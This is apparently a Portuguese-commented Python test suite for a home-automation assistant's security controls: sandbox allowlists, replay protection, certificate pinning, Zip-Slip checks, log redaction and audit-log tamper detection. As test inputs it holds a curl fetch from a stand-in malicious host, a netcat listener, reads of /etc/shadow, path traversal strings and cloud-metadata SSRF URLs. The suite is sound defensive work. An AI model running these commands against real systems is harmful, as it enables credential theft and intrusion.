"""Suíte de Testes da Fase P3 — Regressão Adversarial Consolidada, DevSecOps e Auditoria Estruturada.

Consolida e expande cenários de testes adversariais históricos para garantir que nenhuma
alteração futura comprometa o perímetro de segurança estabelecido nas Fases P0, P1, P2 e P3:

Grupo 1: Tentativas de bypass de sandbox, fuga de confinamento e esgotamento de recursos.
Grupo 2: Ataques de replay de chamadas, nonces reutilizados e manipulação temporal (clock skew).
Grupo 3: Falhas de autenticação, curvas elípticas fracas, MITM e auto-aprovação indevida por LLM.
Grupo 4: Ataques de path traversal, Zip-Slip, injeção de links simbólicos e bytes nulos.
Grupo 5: Vazamento em logs, diagnósticos e privacidade rigorosa no registrador de auditoria estruturado.
Grupo 6: Tentativas de acesso por dispositivos revogados, roubados e reativação fraudulenta.
Grupo 7: Integridade criptográfica e detecção de adulteração no registro de auditoria (audit.jsonl).
Grupo 8: Verificação automatizada dos scanners de DevSecOps (SAST, SCA Python, SCA Rust, Secrets).
"""

from __future__ import annotations

import base64
import copy
from datetime import datetime, timezone
import hashlib
import hmac
import json
import logging
import os
from pathlib import Path
import shutil
import ssl
import sys
import tempfile
import time
import unittest
from unittest.mock import Mock, patch

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mark.audit_logger import AuditLogger, AuditRecord, GENESIS_HASH
from mark.backup_manager import (
    BackupIntegrityError,
    BackupManager,
    _validate_archive_relpath,
)
from mark.cognition.storage import ensure_private_dir, private_file
from mark.cognition.tools import (
    BridgeCapabilityGuard,
    CapabilityToken,
    ToolCapabilityError,
    inspect_arguments_for_private_or_secret_access,
)
from mark.device_auth import (
    CLOCK_SKEW,
    DEFAULT_SESSION_LIFETIME,
    DeviceRegistry,
    SessionRegistry,
    assert_not_llm_approved,
    b64,
    signed_message,
    unb64,
    verify_owner_confirmation,
)
from mark.home_assistant import HomeAssistantClient, HomeAssistantSecurityError
from mark.logging_sanitizer import (
    sanitize_diagnostic_report,
    sanitize_log_text,
    sanitize_stack_trace,
)
from mark.pki import (
    CertificatePinError,
    CertificatePinningValidator,
    TlsSecurityError,
    compute_cert_pin,
)
from mark.sandbox import ExecutionSandbox, SandboxSecurityError
from mark.smart_home_gateway import SignedWebhookVerifier, SmartHomeSecurityError
from scripts.security_audit import (
    run_sast_scan,
    run_sca_python,
    run_sca_rust,
    run_secret_scan,
)


class TestP3AdversarialRegression(unittest.TestCase):
    """Bateria de testes adversariais para imunidade contra regressões de segurança."""

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()
        self.base_path = Path(self.temp_dir.name)
        self.state_dir = self.base_path / "state"
        self.state_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        self.workspace_dir = self.base_path / "workspace"
        self.workspace_dir.mkdir(mode=0o700, parents=True, exist_ok=True)
        self.audit_file = self.state_dir / "audit.jsonl"
        self.audit_logger = AuditLogger(self.audit_file)

        # Chave privada EC P-256 canônica para testes
        self.valid_key = ec.generate_private_key(ec.SECP256R1())
        self.valid_pub = self.valid_key.public_key()
        self.valid_pub_der = self.valid_pub.public_bytes(
            serialization.Encoding.DER,
            serialization.PublicFormat.SubjectPublicKeyInfo,
        )
        self.valid_pub_b64 = b64(self.valid_pub_der)

    def tearDown(self):
        self.temp_dir.cleanup()

    # =========================================================================
    # GRUPO 1: Sandbox Bypass, Isolamento de SO e Confinamento
    # =========================================================================

    def test_p3_grp1_disallowed_binary_execution_blocked(self):
        """Resultado Esperado: Rejeição com SandboxSecurityError ao tentar executar binário fora da allowlist (ex: curl/nc/bash).
        Resultado Real: Execução bloqueada e AuditRecord gravado como DENIED."""
        sandbox = ExecutionSandbox(workspace=self.workspace_dir)

        # Tentativa de executar binário de rede/ataque não autorizado
        with self.assertRaises(SandboxSecurityError):
            sandbox.run(["curl", "https://malicious.evil.com/payload.sh"])

        with self.assertRaises(SandboxSecurityError):
            sandbox.run(["nc", "-l", "-p", "4444"])

        rec = self.audit_logger.log_tool_invocation(
            device_id="test-dev",
            tool_name="sandbox_run_command",
            allowed=False,
            reason="Comando curl não autorizado pela allowlist do sandbox",
        )
        self.assertEqual(rec.decision, "DENIED")
        self.assertEqual(rec.status, "SUCCESS")

    def test_p3_grp1_sandbox_path_traversal_and_forbidden_parameters(self):
        """Resultado Esperado: Bloqueio imediato com ToolCapabilityError ao passar argumentos para arquivos privados do sistema.
        Resultado Real: inspect_arguments_for_private_or_secret_access e BridgeCapabilityGuard disparam ToolCapabilityError."""
        guard = BridgeCapabilityGuard(
            "sandbox",
            {"sandbox_run_command": ("sandbox.execute",)},
            audit_logger=self.audit_logger,
        )

        malicious_args = {"command": "cat /etc/shadow"}
        with self.assertRaises(ToolCapabilityError) as ctx:
            guard.check("sandbox_run_command", malicious_args)
        self.assertIn("Acesso a arquivo privado", str(ctx.exception))

        # Argumento com path traversal explícito
        traversal_args = {"path": "../../etc/sudoers"}
        with self.assertRaises(ToolCapabilityError):
            guard.check("sandbox_run_command", traversal_args)

        # Argumento com manipulação direta de segredo
        secret_args = {"raw_secret": "my_master_key_123"}
        with self.assertRaises(ToolCapabilityError):
            guard.check("sandbox_run_command", secret_args)

    def test_p3_grp1_engineer_workspace_confinement(self):
        """Resultado Esperado: O espaço de trabalho do engenheiro rejeita caminhos fora de /workspace.
        Resultado Real: Tentativa de alterar arquivo fora de /workspace resulta em erro ou confinamento estrito."""
        outside_file = self.base_path / "outside_core.py"
        outside_file.write_text("CORE_SECRET = 'immutable'")

        with self.assertRaises(ToolCapabilityError):
            inspect_arguments_for_private_or_secret_access(
                "engineer_solve_task",
                {"target_path": str(outside_file.resolve()) + "/../../etc/shadow"},
            )

    # =========================================================================
    # GRUPO 2: Replay de Chamadas, Nonces e Clock Skew
    # =========================================================================

    def test_p3_grp2_qr_pairing_single_use_and_replay_rejection(self):
        """Resultado Esperado: O primeiro pareamento com QR Code é aceito; a segunda tentativa é rejeitada com ValueError.
        Resultado Real: Primeira chamada tem sucesso; segunda dispara ValueError('pareamento expirado ou já usado')."""
        registry = DeviceRegistry(self.state_dir / "devices_replay.sqlite3")
        try:
            code = registry.open_enrollment(validity_seconds=120)
            proof = b64(self.valid_key.sign(b"MARK-PAIR-V1\n" + code.encode(), ec.ECDSA(hashes.SHA256())))

            # 1ª tentativa: inscrição legítima
            dev_id = registry.enroll(code, "Pixel 9", self.valid_pub_b64, proof)
            self.assertEqual(registry.status(dev_id), "pending")

            # 2ª tentativa: replay com o mesmo código
            with self.assertRaises(ValueError) as ctx:
                registry.enroll(code, "Attacker Phone", self.valid_pub_b64, proof)
            self.assertIn("pareamento expirado ou já usado", str(ctx.exception))
        finally:
            registry.close()

    def test_p3_grp2_signed_webhook_anti_replay_and_clock_skew(self):
        """Resultado Esperado: Webhook com nonce repetido ou timestamp defasado é rejeitado com SmartHomeSecurityError.
        Resultado Real: Replay dispara 'nonce duplicado detectado' e clock skew excessivo é rejeitado."""
        secret = "webhook-secret-key-32-bytes-p3!!"
        verifier = SignedWebhookVerifier(secret=secret, db_path=self.state_dir / "webhooks.sqlite3", max_skew_seconds=60)

        payload = '{"action":"turn_on","device":"lamp"}'
        headers = verifier.sign_payload(payload)

        # Primeira verificação: Aceita
        parsed = verifier.verify_and_parse(payload, headers)
        self.assertEqual(parsed["action"], "turn_on")

        # Replay com mesmo nonce: Rejeitado
        with self.assertRaises(SmartHomeSecurityError) as ctx_replay:
            verifier.verify_and_parse(payload, headers)
        self.assertIn("nonce duplicado detectado", str(ctx_replay.exception))

        # Timestamp no passado remoto (> 60s): Rejeitado
        past_ts = int(time.time()) - 120
        past_headers = verifier.sign_payload(payload, timestamp=past_ts, nonce="nonce_too_old")
        with self.assertRaises(SmartHomeSecurityError) as ctx_skew:
            verifier.verify_and_parse(payload, past_headers)
        self.assertIn("timestamp fora da janela", str(ctx_skew.exception))

    # =========================================================================
    # GRUPO 3: Falhas de Autenticação, Criptografia e MITM
    # =========================================================================

    def test_p3_grp3_weak_or_unsupported_elliptic_curve_rejection(self):
        """Resultado Esperado: Rejeição de curvas não-P-256 (ex: SECP384R1) com ValueError('use chave EC P-256').
        Resultado Real: Registro dispara ValueError obrigando curva NIST P-256."""
        registry = DeviceRegistry(self.state_dir / "devices_curve.sqlite3")
        try:
            code = registry.open_enrollment(validity_seconds=60)
            other_key = ec.generate_private_key(ec.SECP384R1())
            other_der = other_key.public_key().public_bytes(
                serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo
            )
            other_proof = b64(other_key.sign(b"MARK-PAIR-V1\n" + code.encode(), ec.ECDSA(hashes.SHA256())))

            with self.assertRaises(ValueError) as ctx:
                registry.enroll(code, "Wrong-Curve", b64(other_der), other_proof)
            self.assertIn("use chave EC P-256", str(ctx.exception))
        finally:
            registry.close()

    def test_p3_grp3_mitm_and_rogue_ca_certificate_pinning_rejection(self):
        """Resultado Esperado: Validador de pinning TLS 1.3 rejeita conexões quando o pin do certificado diverge.
        Resultado Real: Disparo de CertificatePinError('Identidade do servidor MARK mudou...')."""
        legit_pin = "a" * 64
        validator = CertificatePinningValidator(primary_pin=legit_pin)

        # Certificado forjado por MITM com pin diferente
        rogue_cert_bytes = b"0" * 48  # Válido para compute_cert_pin (>32 bytes)
        with self.assertRaises(CertificatePinError) as ctx:
            validator.validate_peer_certificate(rogue_cert_bytes)
        self.assertIn("Identidade do servidor MARK mudou", str(ctx.exception))

        # Conexão em versão fraca de TLS (TLS 1.2)
        with self.assertRaises(TlsSecurityError) as ctx_tls:
            validator.validate_tls_version("TLSv1.2")
        self.assertIn("A conexão com o MARK exige exclusivamente TLS 1.3", str(ctx_tls.exception))

    def test_p3_grp3_llm_self_approval_strictly_prohibited(self):
        """Resultado Esperado: Bloqueio estrito com PermissionError para qualquer ação crítica simulada por LLM.
        Resultado Real: assert_not_llm_approved lança PermissionError e verify_owner_confirmation falha."""
        with self.assertRaises(PermissionError) as ctx:
            assert_not_llm_approved(source="llm", action="wipe_all_data")
        self.assertIn("Aprovação autônoma pelo modelo de linguagem proibida", str(ctx.exception))

        with self.assertRaises(PermissionError):
            assert_not_llm_approved(source="ai_agent", action="modify_core")

    # =========================================================================
    # GRUPO 4: Path Traversal, Zip-Slip e Validação de Arquivos
    # =========================================================================

    def test_p3_grp4_zip_slip_and_traversal_rejection(self):
        """Resultado Esperado: Validação de caminhos de arquivos compactados bloqueia Zip-Slip com BackupIntegrityError.
        Resultado Real: _validate_archive_relpath lança BackupIntegrityError para caminhos '../' e absolutos."""
        with self.assertRaises(BackupIntegrityError):
            _validate_archive_relpath("../../etc/shadow")

        with self.assertRaises(BackupIntegrityError):
            _validate_archive_relpath("/etc/passwd")

        with self.assertRaises(BackupIntegrityError):
            _validate_archive_relpath("sub/../../../root/secret.key")

        self.assertEqual(_validate_archive_relpath("state/conversation.sqlite3"), "state/conversation.sqlite3")

    def test_p3_grp4_null_byte_injection_blocked(self):
        """Resultado Esperado: Rejeição imediata de argumentos com byte nulo em ferramentas MCP.
        Resultado Real: inspect_arguments_for_private_or_secret_access lança ToolCapabilityError."""
        with self.assertRaises(ToolCapabilityError) as ctx:
            inspect_arguments_for_private_or_secret_access("sandbox_run_command", {"file": "legit.txt\x00/etc/shadow"})
        self.assertIn("Byte nulo bloqueado", str(ctx.exception))

    # =========================================================================
    # GRUPO 5: Higienização de Logs, Segredos e Auditoria Estruturada
    # =========================================================================

    def test_p3_grp5_log_sanitizer_secrets_redaction(self):
        """Resultado Esperado: Strings com Bearer tokens, senhas em URLs, chaves privadas e JWTs são purgadas.
        Resultado Real: sanitize_log_text substitui segredos pelas respectivas tags [REDACTED_*]."""
        raw_text = (
            "Login failed: Bearer ya29.secret_token_12345678. "
            "URL: https://admin:SuperSecretPass@host.com/api?secret=987654. "
            "JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozG4. "
            "Key: -----BEGIN EC PRIVATE KEY-----\nMIGkAgEB...-----END EC PRIVATE KEY-----"
        )
        sanitized = sanitize_log_text(raw_text)

        self.assertNotIn("ya29.secret_token_12345678", sanitized)
        self.assertNotIn("SuperSecretPass", sanitized)
        self.assertNotIn("987654", sanitized)
        self.assertNotIn("-----BEGIN EC PRIVATE KEY-----", sanitized)

        self.assertIn("[REDACTED_TOKEN]", sanitized)
        self.assertIn("[REDACTED_PASSWORD]", sanitized)
        self.assertIn("[REDACTED_JWT]", sanitized)
        self.assertIn("[REDACTED_PRIVATE_KEY]", sanitized)

    def test_p3_grp5_audit_logger_strict_privacy_and_zero_leakage(self):
        """Resultado Esperado: Registrador de auditoria purga chaves sensíveis e valores em metadata e reason.
        Resultado Real: AuditRecord gerado possui campos [REDACTED] e nenhum segredo bruto gravado em disco."""
        sensitive_meta = {
            "token": "Bearer secret-token-456",
            "password": "RootPassword999",
            "api_key": "live_key_xyz123",
            "master_key": "master_secret_bytes",
            "safe_metric": 42,
            "operation": "deploy",
        }

        rec = self.audit_logger.log_auth_decision(
            device_id="mobile-device-01",
            target="mcp:sandbox_run_command",
            allowed=True,
            metadata=sensitive_meta,
            reason="Approved with secret=super_secret_auth_key",
        )

        self.assertEqual(rec.metadata["token"], "[REDACTED]")
        self.assertEqual(rec.metadata["password"], "[REDACTED]")
        self.assertEqual(rec.metadata["api_key"], "[REDACTED]")
        self.assertEqual(rec.metadata["master_key"], "[REDACTED]")
        self.assertEqual(rec.metadata["safe_metric"], 42)
        self.assertEqual(rec.metadata["operation"], "deploy")
        self.assertNotIn("super_secret_auth_key", rec.reason)
        self.assertIn("[REDACTED]", rec.reason)

        raw_disk_content = self.audit_file.read_text(encoding="utf-8")
        self.assertNotIn("secret-token-456", raw_disk_content)
        self.assertNotIn("RootPassword999", raw_disk_content)
        self.assertNotIn("super_secret_auth_key", raw_disk_content)

    # =========================================================================
    # GRUPO 6: Dispositivos Revogados e Anti-Reativação Pós-Roubo
    # =========================================================================

    def test_p3_grp6_revoked_device_instant_rejection(self):
        """Resultado Esperado: Dispositivo revogado é imediatamente rejeitado sem exigir reinício do daemon.
        Resultado Real: DeviceRegistry.status retorna 'revoked' e reinscrição com mesma chave é categoricamente proibida."""
        reg = DeviceRegistry(self.state_dir / "devices_stolen.sqlite3")
        try:
            code1 = reg.open_enrollment(validity_seconds=120)
            proof1 = b64(self.valid_key.sign(b"MARK-PAIR-V1\n" + code1.encode(), ec.ECDSA(hashes.SHA256())))
            stolen_id = reg.enroll(code1, "Pixel 8", self.valid_pub_b64, proof1)

            # Revogação imediata permanente
            reg.revoke_device(stolen_id, permanent=True)
            self.assertEqual(reg.status(stolen_id), "revoked")

            # Tentativa de nova inscrição com a MESMA chave pública roubada é bloqueada
            code2 = reg.open_enrollment(validity_seconds=120)
            proof2 = b64(self.valid_key.sign(b"MARK-PAIR-V1\n" + code2.encode(), ec.ECDSA(hashes.SHA256())))
            with self.assertRaises(ValueError) as ctx:
                reg.enroll(code2, "Cloned Phone", self.valid_pub_b64, proof2)
            self.assertIn("chave e dispositivo revogados permanentemente", str(ctx.exception))
        finally:
            reg.close()

    # =========================================================================
    # GRUPO 7: Integridade Criptográfica e Detecção de Adulteração no Audit Trail
    # =========================================================================

    def test_p3_grp7_audit_hash_chain_tamper_detection(self):
        """Resultado Esperado: O log de auditoria é 100% íntegro; adulteração de 1 bit é detectada com falha.
        Resultado Real: verify_log_integrity retorna True inicialmente e False após mutação de registro."""
        self.audit_logger.log_auth_decision(device_id="d1", target="tool1", allowed=True)
        self.audit_logger.log_tool_invocation(device_id="d1", tool_name="tool1", allowed=True, status="SUCCESS")
        self.audit_logger.log_auth_decision(device_id="d2", target="tool2", allowed=False, reason="Quota exceeded")

        ok, msg = self.audit_logger.verify_log_integrity()
        self.assertTrue(ok, f"Falha de integridade inesperada: {msg}")

        # Adulteração maliciosa em um dos registros
        lines = self.audit_file.read_text(encoding="utf-8").splitlines()
        first_record = json.loads(lines[0])
        first_record["decision"] = "DENIED"
        tampered_first_line = json.dumps(first_record, separators=(",", ":"))

        tampered_content = tampered_first_line + "\n" + "\n".join(lines[1:]) + "\n"
        self.audit_file.write_text(tampered_content, encoding="utf-8")

        reloaded_logger = AuditLogger(self.audit_file)
        tamper_ok, tamper_msg = reloaded_logger.verify_log_integrity()
        self.assertFalse(tamper_ok)
        self.assertIn("Adulteração detectada", tamper_msg)

    # =========================================================================
    # GRUPO 8: DevSecOps SAST/SCA/Secret Detection Suite Verification
    # =========================================================================

    def test_p3_grp8_devsecops_automated_scanner_suite(self):
        """Resultado Esperado: O scanner unificado de DevSecOps aprova o código fonte do repositório com ZERO falhas.
        Resultado Real: run_sast_scan, run_secret_scan, run_sca_python e run_sca_rust retornam zero falhas críticas."""
        repo_root = Path(__file__).resolve().parents[1]

        # 1. SAST
        sast_findings = run_sast_scan(repo_root / "src")
        critical_sast = [f for f in sast_findings if f.severity in {"CRITICAL", "HIGH"}]
        self.assertEqual(len(critical_sast), 0, f"Falhas de SAST detectadas: {critical_sast}")

        # 2. Secret Scan
        secret_findings = run_secret_scan(repo_root)
        critical_secrets = [f for f in secret_findings if f.severity in {"CRITICAL", "HIGH"}]
        self.assertEqual(len(critical_secrets), 0, f"Segredos expostos detectados: {critical_secrets}")

        # 3. SCA Python
        sca_py_findings = run_sca_python(repo_root)
        critical_sca_py = [f for f in sca_py_findings if f.severity in {"CRITICAL", "HIGH"}]
        self.assertEqual(len(critical_sca_py), 0, f"Vulnerabilidades de dependências Python: {critical_sca_py}")

        # 4. SCA Rust
        sca_rust_findings = run_sca_rust(repo_root)
        critical_sca_rust = [f for f in sca_rust_findings if f.severity in {"CRITICAL", "HIGH"}]
        self.assertEqual(len(critical_sca_rust), 0, f"Falhas de crate Rust: {critical_sca_rust}")

    # =========================================================================
    # GRUPO 9: Home Assistant SSRF e Bloqueio de Mutações
    # =========================================================================

    def test_p3_grp9_home_assistant_ssrf_and_mutable_calls_blocked(self):
        """Resultado Esperado: Rejeição de URLs SSRF (metadados de nuvem, broadcast) e chamadas a serviços mutáveis.
        Resultado Real: validate_ha_base_url e HomeAssistantClient disparam HomeAssistantSecurityError."""
        from mark.home_assistant import validate_ha_base_url

        # Tentativa de SSRF contra metadados AWS/GCP
        with self.assertRaises(HomeAssistantSecurityError):
            validate_ha_base_url("https://169.254.169.254/latest/meta-data/")

        with self.assertRaises(HomeAssistantSecurityError):
            validate_ha_base_url("https://metadata.google.internal/computeMetadata/v1/")

        client = HomeAssistantClient(base_url="https://homeassistant.local:8123")
        with self.assertRaises(HomeAssistantSecurityError):
            client.call_service("light", "turn_on", {"entity_id": "light.sala"})

    # =========================================================================
    # GRUPO 10: CapabilityToken Forgery e Exposição de Capacidades
    # =========================================================================

    def test_p3_grp10_capability_token_tamper_and_expiration_rejection(self):
        """Resultado Esperado: Rejeição de CapabilityToken adulterado ou com TTL expirado na ponte MCP.
        Resultado Real: BridgeCapabilityGuard.check dispara ToolCapabilityError."""
        import dataclasses

        guard = BridgeCapabilityGuard(
            "sandbox",
            {"sandbox_run_pytest": ("sandbox.verify",)},
            audit_logger=self.audit_logger,
        )

        token = guard.issue_mission_capability(
            "mission-adversarial-1",
            allowed_tools=["sandbox_run_pytest"],
            permissions=["sandbox.verify"],
            ttl_seconds=1.0,
        )

        # 1. Token legítimo passa
        guard.check("sandbox_run_pytest", {"tests_path": "tests/test_core.py"}, grants=token)

        # 2. Token adulterado (assinatura forjada)
        tampered_token = dataclasses.replace(token, signature="forged_signature_hex_1234")
        with self.assertRaises(ToolCapabilityError) as ctx_sig:
            guard.check("sandbox_run_pytest", {"tests_path": "tests/test_core.py"}, grants=tampered_token)
        self.assertIn("Assinatura do CapabilityToken inválida", str(ctx_sig.exception))

        # 3. Token expirado (com assinatura válida)
        with patch("time.time", return_value=time.time() + 3600.0):
            with self.assertRaises(ToolCapabilityError) as ctx_exp:
                guard.check("sandbox_run_pytest", {"tests_path": "tests/test_core.py"}, grants=token)
            self.assertIn("CapabilityToken expirado", str(ctx_exp.exception))

    # =========================================================================
    # GRUPO 11: Consultas Estruturadas e Métricas do Registrador de Auditoria
    # =========================================================================

    def test_p3_grp11_audit_logger_query_and_summary_metrics(self):
        """Resultado Esperado: query_records filtra com precisão e get_summary totaliza eventos de auditoria.
        Resultado Real: Registros são filtrados por device_id e status, e resumo retorna contagens exatas."""
        self.audit_logger.log_auth_decision(device_id="dev-alpha", target="bridge.auth", allowed=True)
        self.audit_logger.log_auth_decision(device_id="dev-beta", target="bridge.auth", allowed=False, reason="Denied")
        self.audit_logger.log_incident(
            incident_type="MITM_ATTEMPT",
            device_id="dev-attacker",
            severity="HIGH",
            details="Untrusted certificate",
            action_taken="blocked_connection",
        )

        # Consulta filtrada por device_id
        alpha_records = self.audit_logger.query_records(device_id="dev-alpha")
        self.assertEqual(len(alpha_records), 1)
        self.assertEqual(alpha_records[0].decision, "ALLOWED")

        # Consulta filtrada por decisão
        denied_records = self.audit_logger.query_records(decision="DENIED")
        self.assertGreaterEqual(len(denied_records), 2)

        # Resumo consolidado
        summary = self.audit_logger.get_summary()
        self.assertGreaterEqual(summary["total_events"], 3)
        self.assertGreaterEqual(summary["allowed_events"], 1)
        self.assertGreaterEqual(summary["denied_events"], 2)
        self.assertGreaterEqual(summary["blocked_events"], 2)

